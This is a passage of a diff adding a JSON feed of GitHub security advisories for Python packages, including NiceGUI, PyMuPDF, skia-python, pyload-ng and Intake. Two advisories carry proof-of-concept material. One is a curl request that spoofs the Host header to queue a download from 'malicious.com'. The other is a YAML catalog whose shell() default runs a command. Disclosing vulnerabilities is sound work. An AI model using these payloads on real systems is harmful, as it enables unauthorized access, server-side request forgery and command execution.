+        "vector_string": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+        "score": 7.8
+      },
+      "epss": {
+        "percentage": 5e-05,
+        "percentile": 0.00269
+      }
+    }
+  },
+  {
+    "id": "GHSA-w5g8-5849-vj76",
+    "source": "github",
+    "type": "advisory",
+    "title": "NiceGUI's unvalidated chunk size parameter in media routes can cause memory exhaustion",
+    "description": "## Summary\n\nNiceGUI's `app.add_media_file()` and `app.add_media_files()` media routes accept a user-controlled query parameter that influences how files are read during streaming. The parameter is passed to the range-response implementation without validation, allowing an attacker to bypass chunked streaming and force the server to load entire files into memory at once.\n\nWith large media files and concurrent requests, this can lead to excessive memory consumption, degraded performance, or denial",
+    "severity": "medium",
+    "published_at": "2026-03-19T18:48:27Z",
+    "attack_patterns": [
+      "bypass"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-w5g8-5849-vj76",
+      "cve_id": "CVE-2026-33332",
+      "url": "https://api.github.com/advisories/GHSA-w5g8-5849-vj76",
+      "html_url": "https://github.com/advisories/GHSA-w5g8-5849-vj76",
+      "summary": "NiceGUI's unvalidated chunk size parameter in media routes can cause memory exhaustion",
+      "description": "## Summary\n\nNiceGUI's `app.add_media_file()` and `app.add_media_files()` media routes accept a user-controlled query parameter that influences how files are read during streaming. The parameter is passed to the range-response implementation without validation, allowing an attacker to bypass chunked streaming and force the server to load entire files into memory at once.\n\nWith large media files and concurrent requests, this can lead to excessive memory consumption, degraded performance, or denial of service.\n\n## Impact\n\n**Affected applications:** NiceGUI applications that serve media content via `app.add_media_file()` or `app.add_media_files()`, particularly those serving large files (video, audio).\n\n**What an attacker can do:**\n- Force the server to load entire files into memory instead of streaming them in chunks\n- Amplify memory usage with concurrent requests to large media files\n- Cause performance degradation, memory pressure, and potential OOM conditions\n\n**Attack difficulty:** Low - requires only a crafted query parameter.\n\n## Remediation\n\nUpgrade to a patched version of NiceGUI.\n\nAs a workaround, restrict access to media endpoints or strip unexpected query parameters at a reverse proxy layer.",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/zauberzeug/nicegui/security-advisories/GHSA-w5g8-5849-vj76",
+      "source_code_location": "https://github.com/zauberzeug/nicegui",
+      "identifiers": [
+        {
+          "value": "GHSA-w5g8-5849-vj76",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33332",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/zauberzeug/nicegui/security/advisories/GHSA-w5g8-5849-vj76",
+        "https://github.com/advisories/GHSA-w5g8-5849-vj76"
+      ],
+      "published_at": "2026-03-19T18:48:27Z",
+      "updated_at": "2026-03-19T18:48:28Z",
+      "github_reviewed_at": "2026-03-19T18:48:27Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "nicegui"
+          },
+          "vulnerable_version_range": "<= 3.8.0",
+          "first_patched_version": "3.9.0",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+          "score": 5.3
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+          "score": 6.9
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-770",
+          "name": "Allocation of Resources Without Limits or Throttling"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "aest3ra",
+            "id": 117811685,
+            "node_id": "U_kgDOBwWp5Q",
+            "avatar_url": "https://avatars.githubusercontent.com/u/117811685?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/aest3ra",
+            "html_url": "https://github.com/aest3ra",
+            "followers_url": "https://api.github.com/users/aest3ra/followers",
+            "following_url": "https://api.github.com/users/aest3ra/following{/other_user}",
+            "gists_url": "https://api.github.com/users/aest3ra/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/aest3ra/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/aest3ra/subscriptions",
+            "organizations_url": "https://api.github.com/users/aest3ra/orgs",
+            "repos_url": "https://api.github.com/users/aest3ra/repos",
+            "events_url": "https://api.github.com/users/aest3ra/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/aest3ra/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        },
+        {
+          "user": {
+            "login": "oxqnd",
+            "id": 122880412,
+            "node_id": "U_kgDOB1MBnA",
+            "avatar_url": "https://avatars.githubusercontent.com/u/122880412?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/oxqnd",
+            "html_url": "https://github.com/oxqnd",
+            "followers_url": "https://api.github.com/users/oxqnd/followers",
+            "following_url": "https://api.github.com/users/oxqnd/following{/other_user}",
+            "gists_url": "https://api.github.com/users/oxqnd/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/oxqnd/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/oxqnd/subscriptions",
+            "organizations_url": "https://api.github.com/users/oxqnd/orgs",
+            "repos_url": "https://api.github.com/users/oxqnd/repos",
+            "events_url": "https://api.github.com/users/oxqnd/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/oxqnd/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "analyst"
+        },
+        {
+          "user": {
+            "login": "mjkim610",
+            "id": 17107206,
+            "node_id": "MDQ6VXNlcjE3MTA3MjA2",
+            "avatar_url": "https://avatars.githubusercontent.com/u/17107206?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/mjkim610",
+            "html_url": "https://github.com/mjkim610",
+            "followers_url": "https://api.github.com/users/mjkim610/followers",
+            "following_url": "https://api.github.com/users/mjkim610/following{/other_user}",
+            "gists_url": "https://api.github.com/users/mjkim610/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/mjkim610/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/mjkim610/subscriptions",
+            "organizations_url": "https://api.github.com/users/mjkim610/orgs",
+            "repos_url": "https://api.github.com/users/mjkim610/repos",
+            "events_url": "https://api.github.com/users/mjkim610/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/mjkim610/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "analyst"
+        },
+        {
+          "user": {
+            "login": "evnchn",
+            "id": 37951241,
+            "node_id": "MDQ6VXNlcjM3OTUxMjQx",
+            "avatar_url": "https://avatars.githubusercontent.com/u/37951241?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/evnchn",
+            "html_url": "https://github.com/evnchn",
+            "followers_url": "https://api.github.com/users/evnchn/followers",
+            "following_url": "https://api.github.com/users/evnchn/following{/other_user}",
+            "gists_url": "https://api.github.com/users/evnchn/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/evnchn/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/evnchn/subscriptions",
+            "organizations_url": "https://api.github.com/users/evnchn/orgs",
+            "repos_url": "https://api.github.com/users/evnchn/repos",
+            "events_url": "https://api.github.com/users/evnchn/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/evnchn/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_developer"
+        },
+        {
+          "user": {
+            "login": "Khaliun-sw1",
+            "id": 149303168,
+            "node_id": "U_kgDOCOYvgA",
+            "avatar_url": "https://avatars.githubusercontent.com/u/149303168?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/Khaliun-sw1",
+            "html_url": "https://github.com/Khaliun-sw1",
+            "followers_url": "https://api.github.com/users/Khaliun-sw1/followers",
+            "following_url": "https://api.github.com/users/Khaliun-sw1/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Khaliun-sw1/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/Khaliun-sw1/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Khaliun-sw1/subscriptions",
+            "organizations_url": "https://api.github.com/users/Khaliun-sw1/orgs",
+            "repos_url": "https://api.github.com/users/Khaliun-sw1/repos",
+            "events_url": "https://api.github.com/users/Khaliun-sw1/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/Khaliun-sw1/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        },
+        {
+          "user": {
+            "login": "falkoschindler",
+            "id": 5767091,
+            "node_id": "MDQ6VXNlcjU3NjcwOTE=",
+            "avatar_url": "https://avatars.githubusercontent.com/u/5767091?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/falkoschindler",
+            "html_url": "https://github.com/falkoschindler",
+            "followers_url": "https://api.github.com/users/falkoschindler/followers",
+            "following_url": "https://api.github.com/users/falkoschindler/following{/other_user}",
+            "gists_url": "https://api.github.com/users/falkoschindler/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/falkoschindler/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/falkoschindler/subscriptions",
+            "organizations_url": "https://api.github.com/users/falkoschindler/orgs",
+            "repos_url": "https://api.github.com/users/falkoschindler/repos",
+            "events_url": "https://api.github.com/users/falkoschindler/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/falkoschindler/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "remediation_developer"
+        }
+      ],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L",
+        "score": 5.3
+      }
+    }
+  },
+  {
+    "id": "GHSA-cxqh-p2w9-fmr7",
+    "source": "github",
+    "type": "advisory",
+    "title": "PyMuPDF has a path traversal in _main_.py",
+    "description": "A path traversal and arbitrary file write vulnerability exist in the embedded get function in '_main_.py' in PyMuPDF version, 1.26.5.",
+    "severity": "medium",
+    "published_at": "2026-03-19T18:31:18Z",
+    "attack_patterns": [
+      "path",
+      "traversal"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-cxqh-p2w9-fmr7",
+      "cve_id": "CVE-2026-3029",
+      "url": "https://api.github.com/advisories/GHSA-cxqh-p2w9-fmr7",
+      "html_url": "https://github.com/advisories/GHSA-cxqh-p2w9-fmr7",
+      "summary": "PyMuPDF has a path traversal in _main_.py",
+      "description": "A path traversal and arbitrary file write vulnerability exist in the embedded get function in '_main_.py' in PyMuPDF version, 1.26.5.",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": null,
+      "source_code_location": "https://github.com/pymupdf/PyMuPDF",
+      "identifiers": [
+        {
+          "value": "GHSA-cxqh-p2w9-fmr7",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-3029",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-3029",
+        "https://www.kb.cert.org/vuls/id/504749",
+        "http://github.com/pymupdf/PyMuPDF",
+        "http://github.com/pymupdf/PyMuPDF/commit/603cafe38a183b8bab34f16d05043b4185d8d40a",
+        "https://github.com/advisories/GHSA-cxqh-p2w9-fmr7"
+      ],
+      "published_at": "2026-03-19T18:31:18Z",
+      "updated_at": "2026-03-19T19:37:55Z",
+      "github_reviewed_at": "2026-03-19T19:37:53Z",
+      "nvd_published_at": "2026-03-19T16:16:04Z",
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "PyMuPDF"
+          },
+          "vulnerable_version_range": ">= 1.26.5, < 1.26.7",
+          "first_patched_version": "1.26.7",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": null,
+          "score": 0.0
+        },
+        "cvss_v4": {
+          "vector_string": "CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+          "score": 6.9
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-22",
+          "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+        }
+      ],
+      "credits": [],
+      "cvss": {
+        "vector_string": null,
+        "score": null
+      },
+      "epss": {
+        "percentage": 0.00025,
+        "percentile": 0.06606
+      }
+    }
+  },
+  {
+    "id": "GHSA-2mhw-8qcg-gr96",
+    "source": "github",
+    "type": "advisory",
+    "title": "skia-python vendors vulnerable libfreetype because of pinned cibuildwheel version",
+    "description": "### Impact\n\nThe Linux wheels for skia-python vendor a vulnerable version of\nlibfreetype that is affected by CVE-2025-27363 [1].\n\nThe root cause is a chain of unfortunate events:\n\n1. skia-python builds wheels using pinned pypa/cibuildwheel@2.21.3 [2]\n\n2. cibuildwheel 2.21.3 in turn pins manylinux container images [3]\n\n3. In these images, version 2.9.1-9.el8 of RedHat package freetype is\n*preinstalled*. This package version is vulnerable and has since been\npatched in 2.9.1-10.\n\n4. During the skia-",
+    "severity": "high",
+    "published_at": "2026-03-19T18:10:25Z",
+    "attack_patterns": [],
+    "raw": {
+      "ghsa_id": "GHSA-2mhw-8qcg-gr96",
+      "cve_id": null,
+      "url": "https://api.github.com/advisories/GHSA-2mhw-8qcg-gr96",
+      "html_url": "https://github.com/advisories/GHSA-2mhw-8qcg-gr96",
+      "summary": "skia-python vendors vulnerable libfreetype because of pinned cibuildwheel version",
+      "description": "### Impact\n\nThe Linux wheels for skia-python vendor a vulnerable version of\nlibfreetype that is affected by CVE-2025-27363 [1].\n\nThe root cause is a chain of unfortunate events:\n\n1. skia-python builds wheels using pinned pypa/cibuildwheel@2.21.3 [2]\n\n2. cibuildwheel 2.21.3 in turn pins manylinux container images [3]\n\n3. In these images, version 2.9.1-9.el8 of RedHat package freetype is\n*preinstalled*. This package version is vulnerable and has since been\npatched in 2.9.1-10.\n\n4. During the skia-python Linux build, libfreetype is vendored from the\nsystem, resulting in skia-python.libs/libfreetype-29a7443c.so.6.16.1\n\n[ To find the provenance of your vendored libfreetype, we extracted the\n8-character hash of the original binary file that is added during the\nbuild process (29a7443c), and matched it against our database of hashes\nall historic Red Hat, Debian and Ubuntu releases of freetype. ]\n\n5. Because freetype is only a *transitive* dependency of the packages\nexplicitly installed by the build script [4], it is not upgraded to the\npatched version [4].\n\n5. As a result, the published wheels embed a vulnerable libfreetype,\neven though patched packages are available upstream.\n\nThis appears to be a broader manylinux ecosystem issue. The base images\ndo not enforce that `yum update` runs on container start, so\npreinstalled libraries may remain vulnerable indefinitely.\n\n\n### Patches\n\n> In the case of skia-python, the solution is to explicitly install freetype in the build process and rebuild the wheels.\n\nThe original report was suggesting the above, but in the current `build_Linux.sh` script, the patched `freetype-devel` version 2.9.1-10 gets installed as a dependency. It's just that we need to rebuild the wheel for a new release.\n\n### Workarounds\n\nUsers must upgrade the wheel package after release.\n\n### References\n\n1. https://nvd.nist.gov/vuln/detail/CVE-2025-27363\n2. https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/.github/workflows/ci.yml#L38\n3. https://github.com/pypa/cibuildwheel/blob/v2.21.3/cibuildwheel/resources/pinned_docker_images.cfg\n4. https://github.com/kyamagu/skia-python/blob/9ffb045811f9b5508e152302d5b81aadca6edd8d/scripts/build_Linux.sh#L6",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/skia-python/skia-python/security-advisories/GHSA-2mhw-8qcg-gr96",
+      "source_code_location": "https://github.com/kyamagu/skia-python",
+      "identifiers": [
+        {
+          "value": "GHSA-2mhw-8qcg-gr96",
+          "type": "GHSA"
+        }
+      ],
+      "references": [
+        "https://github.com/kyamagu/skia-python/security/advisories/GHSA-2mhw-8qcg-gr96",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-27363",
+        "https://github.com/advisories/GHSA-2mhw-8qcg-gr96"
+      ],
+      "published_at": "2026-03-19T18:10:25Z",
+      "updated_at": "2026-03-19T18:10:26Z",
+      "github_reviewed_at": "2026-03-19T18:10:25Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "skia-python"
+          },
+          "vulnerable_version_range": "= 144.0",
+          "first_patched_version": null,
+          "vulnerable_functions": []
+        },
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "skia-python"
+          },
+          "vulnerable_version_range": "<= 138.0",
+          "first_patched_version": "144.0.post1",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+          "score": 8.1
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-787",
+          "name": "Out-of-bounds Write"
+        },
+        {
+          "cwe_id": "CWE-1395",
+          "name": "Dependency on Vulnerable Third-Party Component"
+        }
+      ],
+      "credits": [],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
+        "score": 8.1
+      }
+    }
+  },
+  {
+    "id": "GHSA-q485-cg9q-xq2r",
+    "source": "github",
+    "type": "advisory",
+    "title": "Improper Authentication and Origin Validation Error in pyload-ng",
+    "description": "### Summary\n\nA Host Header Spoofing vulnerability in the `@local_check` decorator allows unauthenticated external attackers to bypass local-only restrictions. This grants access to the Click'N'Load API endpoints, enabling attackers to remotely queue arbitrary downloads, leading to Server-Side Request Forgery (SSRF) and Denial of Service (DoS).\n\n### Details\n\nThe `pyload` WebUI provides an API for the Click'N'Load plugin, which is intended to be accessed only from the local machine (e.g., via a br",
+    "severity": "medium",
+    "published_at": "2026-03-19T17:55:53Z",
+    "attack_patterns": [
+      "bypass",
+      "remote",
+      "spoofing"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-q485-cg9q-xq2r",
+      "cve_id": "CVE-2026-33314",
+      "url": "https://api.github.com/advisories/GHSA-q485-cg9q-xq2r",
+      "html_url": "https://github.com/advisories/GHSA-q485-cg9q-xq2r",
+      "summary": "Improper Authentication and Origin Validation Error in pyload-ng",
+      "description": "### Summary\n\nA Host Header Spoofing vulnerability in the `@local_check` decorator allows unauthenticated external attackers to bypass local-only restrictions. This grants access to the Click'N'Load API endpoints, enabling attackers to remotely queue arbitrary downloads, leading to Server-Side Request Forgery (SSRF) and Denial of Service (DoS).\n\n### Details\n\nThe `pyload` WebUI provides an API for the Click'N'Load plugin, which is intended to be accessed only from the local machine (e.g., via a browser extension sending requests to `localhost:9666`). To enforce this, the `pyload` application uses a `@local_check` decorator on the relevant routes in `src/pyload/webui/app/blueprints/cnl_blueprint.py`.\n\nHowever, the `@local_check` implementation relies on the user-controlled `HTTP_HOST` (derived from the HTTP `Host` header) to verify the origin:\n\n```python\n# src/pyload/webui/app/blueprints/cnl_blueprint.py\ndef local_check(func):\n    @wraps(func)\n    def wrapper(*args, **kwargs):\n        remote_addr = flask.request.environ.get(\"REMOTE_ADDR\", \"0\")\n        http_host = flask.request.environ.get(\"HTTP_HOST\", \"0\")\n\n        if remote_addr in (\"127.0.0.1\", \"::ffff:127.0.0.1\", \"::1\", \"localhost\") or http_host in (\n                \"127.0.0.1:9666\",\n                \"[::1]:9666\",\n        ):\n            return func(*args, **kwargs)\n        else:\n            return \"Forbidden\", 403\n    return wrapper\n```\n\nBecause `http_host` is read directly from the `Host` header of the HTTP request, an external attacker can easily spoof this header (e.g., `Host: 127.0.0.1:9666`). When this spoofed header is present, the condition `http_host in (\"127.0.0.1:9666\", ...)` evaluates to `True`, completely bypassing the IP address check (`remote_addr`) and granting access to the protected functions.\n\nThe affected routes are:\n\n- `/flash/` and `/flash/<id>`\n- `/flash/add`\n- `/flash/addcrypted`\n- `/flash/addcrypted2`\n- `/flashgot` and `/flashgot_pyload`\n- `/flash/checkSupportForUrl`\n\n### PoC\n\n1. Ensure the PyLoad instance is running and accessible externally.\n2. Ensure the `ClickNLoad` plugin is enabled in the PyLoad settings (it evaluates to disabled by default).\n3. Send a POST request to one of the protected endpoints, such as `/flash/add`, and spoof the `Host` header to `127.0.0.1:9666`.\n\nExample `curl` command:\n\n```bash\ncurl -i -X POST \"http://<pyload-external-ip>:<port>/flash/add\" \\\n     -H \"Host: 127.0.0.1:9666\" \\\n     -d \"urls=http://malicious.com/payload.bin\" \\\n     -d \"package=MaliciousPackage\"\n```\n\n4. Notice that you receive a `success\\r\\n` response instead of a `403 Forbidden`. The package and URL will be successfully added to the PyLoad queue.\n\n### Impact\n\nThis vulnerability allows unauthenticated attackers to interact with the Click'N'Load API. Attackers can arbitrarily add URLs to the download queue, which forces the PyLoad server to make outbound requests to attacker-controlled or internal URLs (SSRF). Attackers can also exhaust the server's storage or bandwidth by queueing massive files (DoS).",
+      "type": "reviewed",
+      "severity": "medium",
+      "repository_advisory_url": "https://api.github.com/repos/pyload/pyload/security-advisories/GHSA-q485-cg9q-xq2r",
+      "source_code_location": "https://github.com/pyload/pyload",
+      "identifiers": [
+        {
+          "value": "GHSA-q485-cg9q-xq2r",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33314",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/pyload/pyload/security/advisories/GHSA-q485-cg9q-xq2r",
+        "https://github.com/advisories/GHSA-q485-cg9q-xq2r"
+      ],
+      "published_at": "2026-03-19T17:55:53Z",
+      "updated_at": "2026-03-19T17:55:55Z",
+      "github_reviewed_at": "2026-03-19T17:55:53Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "pyload-ng"
+          },
+          "vulnerable_version_range": "<= 0.5.0b3.dev96",
+          "first_patched_version": "0.5.0b3.dev97",
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+          "score": 6.5
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-287",
+          "name": "Improper Authentication"
+        },
+        {
+          "cwe_id": "CWE-346",
+          "name": "Origin Validation Error"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "Jaynornj",
+            "id": 26265990,
+            "node_id": "MDQ6VXNlcjI2MjY1OTkw",
+            "avatar_url": "https://avatars.githubusercontent.com/u/26265990?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/Jaynornj",
+            "html_url": "https://github.com/Jaynornj",
+            "followers_url": "https://api.github.com/users/Jaynornj/followers",
+            "following_url": "https://api.github.com/users/Jaynornj/following{/other_user}",
+            "gists_url": "https://api.github.com/users/Jaynornj/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/Jaynornj/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/Jaynornj/subscriptions",
+            "organizations_url": "https://api.github.com/users/Jaynornj/orgs",
+            "repos_url": "https://api.github.com/users/Jaynornj/repos",
+            "events_url": "https://api.github.com/users/Jaynornj/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/Jaynornj/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
+        "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:L",
+        "score": 6.5
+      }
+    }
+  },
+  {
+    "id": "GHSA-37g4-qqqv-7m99",
+    "source": "github",
+    "type": "advisory",
+    "title": "Intake has a Command Injection via shell() Expansion in Parameter Defaults",
+    "description": "### Summary\nThe shell() syntax within parameter default values appears to be automatically expanded during the catalog parsing process.\nIf a catalog contains a parameter default such as shell(<command>), the command may be executed when the catalog source is accessed.\nThis means that if a user loads a malicious catalog YAML, embedded commands could execute on the host system.\nThis behavior could potentially be classified as OS Command Injection / Unsafe Shell Expansion.\n\n### Details\nThe issue ap",
+    "severity": "high",
+    "published_at": "2026-03-19T17:46:54Z",
+    "attack_patterns": [
+      "inject",
+      "execute",
+      "privilege",
+      "path"
+    ],
+    "raw": {
+      "ghsa_id": "GHSA-37g4-qqqv-7m99",
+      "cve_id": "CVE-2026-33310",
+      "url": "https://api.github.com/advisories/GHSA-37g4-qqqv-7m99",
+      "html_url": "https://github.com/advisories/GHSA-37g4-qqqv-7m99",
+      "summary": "Intake has a Command Injection via shell() Expansion in Parameter Defaults",
+      "description": "### Summary\nThe shell() syntax within parameter default values appears to be automatically expanded during the catalog parsing process.\nIf a catalog contains a parameter default such as shell(<command>), the command may be executed when the catalog source is accessed.\nThis means that if a user loads a malicious catalog YAML, embedded commands could execute on the host system.\nThis behavior could potentially be classified as OS Command Injection / Unsafe Shell Expansion.\n\n### Details\nThe issue appears to originate from how parameter default values are expanded when a catalog source is accessed.\n\nDuring catalog loading and source access:\n\nIntake resolves parameter default values\nThe function responsible for expanding defaults processes the shell() syntax\nThe shell expression triggers a subprocess execution\nBecause this occurs during catalog evaluation, the command may execute before the user explicitly interacts with the dataset itself.\n\nAffected logic appears to involve:\n```\nexpand_defaults()\n```\nand related parameter parsing mechanisms.\n\n\n### PoC\nexploit.yaml\n```\nmetadata:\n  version: 1\nsources:\n  rce_test:\n    driver: csv\n    description: \"Testing shell expansion in parameters\"\n    args:\n      urlpath: \"{{ cmd_exec }}\"\n    parameters:\n      cmd_exec:\n        display_name: \"Test Parameter\"\n        type: str\n        default: \"shell(touch /tmp/intake_rce_test)\"\n```\n\nreproduce.py\n```\nimport intake\nimport os\n\nPROOF_FILE = \"/tmp/intake_rce_test\"\n\nif os.path.exists(PROOF_FILE):\n    os.remove(PROOF_FILE)\n\nprint(f\"[*] Proof file exists before: {os.path.exists(PROOF_FILE)}\")\n\ntry:\n    cat = intake.open_catalog(\"exploit.yaml\")\n\n    print(\"Accessing source...\")\n    _ = cat[\"rce_test\"]\n\nexcept Exception as e:\n    print(f\" Error during execution: {e}\")\n\nif os.path.exists(PROOF_FILE):\n    print(f\" Command execution confirmed, Found: {PROOF_FILE}\")\nelse:\n    print(\"Command execution did not occur.\")\n```\n### Attack Scenario\nA potential attack scenario could be:\n\n1. An attacker publishes a malicious Intake catalog YAML file\n2. The victim downloads or loads the catalog\n3. The victim accesses a source entry in the catalog\n4. Parameter defaults are expanded\n5. The shell() expression triggers execution of the embedded command\n\n### Impact\n\nIf this behavior is confirmed to be unintended, an attacker could distribute a malicious catalog file via:\n\n- Git repositories\n- shared datasets\n- URLs\n- data science workflows\n- Any user loading the catalog could unknowingly execute commands with their local user privileges.\n\n### Recommendation\nPossible mitigations could include:\n\n- disabling shell() expansion by default\n- requiring an explicit opt-in flag (e.g., allow_shell=True)\n- restricting shell execution for catalogs loaded from untrusted sources\nPlease let me know if additional information or testing is needed.\nI'm happy to assist with further analysis or validation.",
+      "type": "reviewed",
+      "severity": "high",
+      "repository_advisory_url": "https://api.github.com/repos/intake/intake/security-advisories/GHSA-37g4-qqqv-7m99",
+      "source_code_location": "https://github.com/intake/intake",
+      "identifiers": [
+        {
+          "value": "GHSA-37g4-qqqv-7m99",
+          "type": "GHSA"
+        },
+        {
+          "value": "CVE-2026-33310",
+          "type": "CVE"
+        }
+      ],
+      "references": [
+        "https://github.com/intake/intake/security/advisories/GHSA-37g4-qqqv-7m99",
+        "https://github.com/advisories/GHSA-37g4-qqqv-7m99"
+      ],
+      "published_at": "2026-03-19T17:46:54Z",
+      "updated_at": "2026-03-19T17:46:55Z",
+      "github_reviewed_at": "2026-03-19T17:46:54Z",
+      "nvd_published_at": null,
+      "withdrawn_at": null,
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "intake"
+          },
+          "vulnerable_version_range": "<= 2.0.9",
+          "first_patched_version": null,
+          "vulnerable_functions": []
+        }
+      ],
+      "cvss_severities": {
+        "cvss_v3": {
+          "vector_string": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+          "score": 8.8
+        },
+        "cvss_v4": {
+          "vector_string": null,
+          "score": 0.0
+        }
+      },
+      "cwes": [
+        {
+          "cwe_id": "CWE-78",
+          "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+        },
+        {
+          "cwe_id": "CWE-94",
+          "name": "Improper Control of Generation of Code ('Code Injection')"
+        }
+      ],
+      "credits": [
+        {
+          "user": {
+            "login": "redyank",
+            "id": 96334924,
+            "node_id": "U_kgDOBb30TA",
+            "avatar_url": "https://avatars.githubusercontent.com/u/96334924?v=4",
+            "gravatar_id": "",
+            "url": "https://api.github.com/users/redyank",
+            "html_url": "https://github.com/redyank",
+            "followers_url": "https://api.github.com/users/redyank/followers",
+            "following_url": "https://api.github.com/users/redyank/following{/other_user}",
+            "gists_url": "https://api.github.com/users/redyank/gists{/gist_id}",
+            "starred_url": "https://api.github.com/users/redyank/starred{/owner}{/repo}",
+            "subscriptions_url": "https://api.github.com/users/redyank/subscriptions",
+            "organizations_url": "https://api.github.com/users/redyank/orgs",
+            "repos_url": "https://api.github.com/users/redyank/repos",
+            "events_url": "https://api.github.com/users/redyank/events{/privacy}",
+            "received_events_url": "https://api.github.com/users/redyank/received_events",
+            "type": "User",
+            "user_view_type": "public",
+            "site_admin": false
+          },
+          "type": "reporter"
+        }
+      ],
+      "cvss": {
